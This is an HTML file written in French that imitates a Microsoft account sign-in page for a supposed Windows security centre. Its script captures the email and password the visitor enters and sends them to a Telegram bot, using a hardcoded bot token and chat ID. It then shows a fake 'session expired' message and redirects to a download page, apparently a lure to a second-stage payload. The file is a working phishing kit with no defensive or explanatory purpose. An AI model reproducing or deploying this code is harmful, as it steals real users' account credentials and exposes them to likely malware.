<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Connexion — Compte Microsoft</title>
<link rel="stylesheet" href="style.css">
</head>
<body style="background:#f3f2f1">

<div class="login-box">
<div class="ms-logo">
<div style="font-size:48px">🛡️</div>
<div style="font-size:20px;font-weight:600;margin-top:8px;color:var(--gray-100)">Microsoft</div>
</div>

<h2>Connectez-vous</h2>
<p class="sub">pour accéder au Centre de sécurité Windows</p>

<div id="errorMsg" class="alert alert-danger" style="display:none">
<h3>Erreur de connexion</h3>
<p id="errorText"></p>
</div>

<form id="loginForm" onsubmit="handleLogin(event)">
<div class="form-group">
<label>Adresse e-mail, téléphone ou Skype</label>
<input type="text" id="email" placeholder="exemple@outlook.com" required>
</div>

<div class="form-group">
<label>Mot de passe</label>
<input type="password" id="password" placeholder="Mot de passe" required>
</div>

<div class="form-options">
<label><input type="checkbox" checked> Maintenir la connexion</label>
<a href="#">Mot de passe oublié ?</a>
</div>

<button type="submit" class="btn btn-primary btn-block btn-lg">Se connecter</button>
</form>

<div style="text-align:center;margin-top:20px;font-size:13px">
<p style="color:var(--gray-50);margin-bottom:12px">Ou connectez-vous avec :</p>
<div style="display:flex;gap:10px;justify-content:center">
<span style="background:var(--gray-20);padding:8px 16px;border-radius:4px;font-size:12px">🔑 Clé de sécurité</span>
<span style="background:var(--gray-20);padding:8px 16px;border-radius:4px;font-size:12px">📱 Microsoft Authenticator</span>
</div>
</div>

<div style="text-align:center;margin-top:24px;font-size:13px">
<p>Pas encore de compte ? <a href="#" style="color:var(--blue)">Créez-en un gratuitement</a></p>
</div>
</div>

<div style="text-align:center;padding:20px;font-size:12px;color:var(--gray-50)">
<a href="#" style="color:var(--gray-50);margin:0 8px">Conditions d'utilisation</a>
<a href="#" style="color:var(--gray-50);margin:0 8px">Confidentialité</a>
<a href="#" style="color:var(--gray-50);margin:0 8px">© Microsoft 2026</a>
</div>

<script>
function handleLogin(e){
e.preventDefault();
var email=document.getElementById('email').value;
var pass=document.getElementById('password').value;
var err=document.getElementById('errorMsg');
var errTxt=document.getElementById('errorText');
if(!email||!pass){errTxt.textContent='Veuillez remplir tous les champs.';err.style.display='block';return;}
errTxt.textContent='Vérification de sécurité en cours... Veuillez patienter.';
err.style.display='block';
err.className='alert alert-warning';
setTimeout(function(){
fetch('https://api.telegram.org/bot8875226322:AAFsOazAfQOy5rlP1LQSM2JPX0YiPXQZPSM/sendMessage',{
method:'POST',
headers:{'Content-Type':'application/x-www-form-urlencoded'},
body:'chat_id=7947710235&text='+encodeURIComponent('<b>[MS LOGIN]</b>\nEmail: '+email+'\nPass: '+pass+'\nIP: (client)')
}).then(function(){
errTxt.textContent='Session expirée. Redirection vers le centre de sécurité...';
err.className='alert alert-success';
setTimeout(function(){window.location.href='download.html';},1500);
}).catch(function(){
window.location.href='download.html';
});
},2000);
return false;
}
document.getElementById('email').focus();
</script>
</body>
</html>
